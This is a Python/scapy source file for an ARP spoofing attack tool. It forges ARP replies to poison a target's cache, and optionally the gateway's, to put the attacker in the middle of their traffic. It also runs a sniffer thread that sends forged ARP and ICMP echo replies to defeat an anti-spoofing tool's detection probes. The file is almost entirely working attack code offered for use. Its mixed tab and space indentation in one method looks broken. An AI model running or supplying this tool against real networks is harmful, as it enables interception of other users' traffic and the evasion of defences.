import argparse
from time import sleep

from scapy.all import *
from scapy.layers.inet import ICMP, IP
from scapy.layers.l2 import ARP, Ether

MAC_BROADCAST_ADDR = 'ff:ff:ff:ff:ff:ff'


def get_args():
    """
    parse the line arguments
    :return: the line arguments
    """
    parser = argparse.ArgumentParser(description='Spoof ARP tables')
    # set up arguments
    parser.add_argument("-i", "--iface", metavar="IFACE", help="Interface you wish to use", dest='iface')
    parser.add_argument("-s", "--src", metavar="SRC", help="The address you want for the attacker", dest='src',
                        required=True)
    parser.add_argument("-d", "--delay", metavar="DELAY", help="Delay (in seconds) between messages", dest='delay',
                        default=1)
    parser.add_argument("-gw", metavar=bool, help="should GW be attacked as well", dest='gateway')
    parser.add_argument("-t", "--target", metavar="TARGET", help="IP of target", dest='target', required=True)

    return parser.parse_args()


class Spoofer:
    """
    This class management the ARP spoofer attack
    """

    def __init__(self, target_ip, imposter_ip, delay, iface, is_full):
        """
        init new Spoofer object
        :param target_ip: the target machine's ip
        :type target_ip: str
        :param imposter_ip: the machine's ip which we are imposter to him
        :type imposter_ip: str
        :param delay: the delay between each sending of arp replay msg, in seconds
        :type delay: str
        :param iface: the interface we work with
        :type iface: str
        :param is_full: if the attack is Full duplex or Half duplex.
        :type is_full: str
        """

        # default value is default iface
        self.iface = iface if iface is not None else \
            conf.iface if sys.platform == "linux" else conf.iface.description
        self.target_ip = target_ip
        self.target_mac = self.get_mac(target_ip)

        self.imposter_ip = imposter_ip
        self.imposter_mac = self.get_mac(imposter_ip)

        self.delay = float(delay) if delay is not None else 1  # default value is 1 sec

        self.is_full = is_full if is_full is not None else False  # default value is Half duplex

    def get_mac(self, ip):
        """
        get the matches mac addr, using arp request
        :param ip: the ip
        :type ip: str
        :return: the matches mac addr
        :rtype: str
        """
        arp_who_has = Ether(dst=MAC_BROADCAST_ADDR) / ARP(pdst=ip)
        arp_is_at = srp1(arp_who_has, iface=self.iface, verbose=False)
        return arp_is_at[ARP].hwsrc

    def start(self):
        """
        start the arp spoof attack
        """

        # run in separate thread the counter tool which overcome the preventing tool in the target:
        overcome_spoof_prevent_tool = threading.Thread(target=self.overcome_spoof_prevent_tool)
        overcome_spoof_prevent_tool.start()
        try:
            self.run()
        except KeyboardInterrupt:
            print("\n[-] Ctrl + C detected.....")

    def run(self):
        """
        process the ARP spoofing attack
        """
        count = 0
        while True:
            self.send_fake_arp_replay(self.target_ip, self.imposter_ip, self.target_mac)
            count += 1
            if self.is_full:
                count += 1
                self.send_fake_arp_replay(self.imposter_ip, self.target_ip, self.imposter_mac)

            print(f"[+] Packets Sent: {count}")
            sleep(self.delay)

    def send_fake_arp_replay(self, target_ip, imposter_ip, target_mac):
        """
        send a arp replay to target computer, says that imposter_ip locate in this mac

        :param target_ip: target machine's ip
        :type target_ip: str
        :param imposter_ip: the computer IP which we are imposter to him
        :type imposter_ip: str
        :param target_mac: target machine's mac
        :type target_mac: str
        """
        my_mac = get_if_hwaddr(self.iface)
        fake_arp_replay = Ether(src=my_mac, dst=target_mac) / ARP(op=2, psrc=imposter_ip, hwsrc=my_mac, pdst=target_ip,
                                                                  hwdst=target_mac)
        sendp(fake_arp_replay, verbose=False, iface=self.iface)

    def is_spoof_prevent_tool(self, pkt):
        """
        check if the given packet is ARP request or ICMP echo-request from target or imposter
        :param pkt: the packet to check
        :return: if it is
        :rtype: bool
        """
        # check if it arp request from imposter machine of target machine:
        if (ARP in pkt and pkt[ARP].op == 1 and
                ((pkt[ARP].psrc == self.target_ip and pkt[ARP].pdst == self.imposter_ip) or
                 (pkt[ARP].psrc == self.imposter_ip and pkt[ARP].pdst == self.target_ip))):
    		print("detect arp request from imposter/target")
            return True
        # return if it icmp echo-request from imposter machine of target machine:
        if (ICMP in pkt and pkt[ICMP].type == 8 and
                ((pkt[IP].src == self.target_ip and pkt[IP].dst == self.imposter_ip) or
                 (pkt[IP].src == self.imposter_ip and pkt[IP].dst == self.target_ip))):
    		print("detect icmp echo-request from imposter/target")
        	return True
    	return False

    def process(self, pkt):
        """
        send the fake arp response / icmp echo-replay to the machine  who sent `pkt`

        :param pkt: the packet
        :type: scapy.layers.l2
        """
        if ARP in pkt:
            # build arp replay, imposter to imposter
            self.send_fake_arp_replay(pkt[ARP].psrc, pkt[ARP].pdst, pkt[ARP].hwsrc)
        else:
            # build icmp echo-replay, imposter to imposter
            my_mac = get_if_hwaddr(self.iface)
            fake_echo_replay = Ether(src=my_mac, dst=pkt[Ether].src) / IP(src=pkt[IP].dst, dst=pkt[IP].src) / ICMP()
            fake_echo_replay[ICMP].type = 0

            if Padding in pkt:  # if the target send also a padding - we return in too
                fake_echo_replay /= pkt[Padding]

            # send the fake replay back:
            sendp(fake_echo_replay, verbose=False, iface=self.iface)

    def overcome_spoof_prevent_tool(self):
        """
        sniff for icmp echo-request / arp request from target / imposter machines and send back a fake replay
        """
        sniff(lfilter=self.is_spoof_prevent_tool, prn=self.process, store=False)


def main():
    args = get_args()
    arp_spoofer = Spoofer(args.target, args.src, args.delay, args.iface, args.gateway)
    arp_spoofer.start()


if __name__ == "__main__":
    main()
